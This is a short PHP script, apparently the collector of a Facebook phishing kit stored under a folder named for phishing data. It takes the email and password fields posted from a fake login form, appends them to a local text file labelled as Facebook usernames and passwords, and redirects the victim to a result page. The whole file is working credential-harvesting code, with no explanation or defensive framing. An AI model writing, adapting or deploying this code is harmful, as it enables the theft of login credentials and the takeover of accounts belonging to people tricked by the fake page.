<?php

file_put_contents("/home/lnwper/S7IAM-PHISH-data/usernames.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
    ob_flush();
    flush();
header('Location: ./result.html');
exit();
?>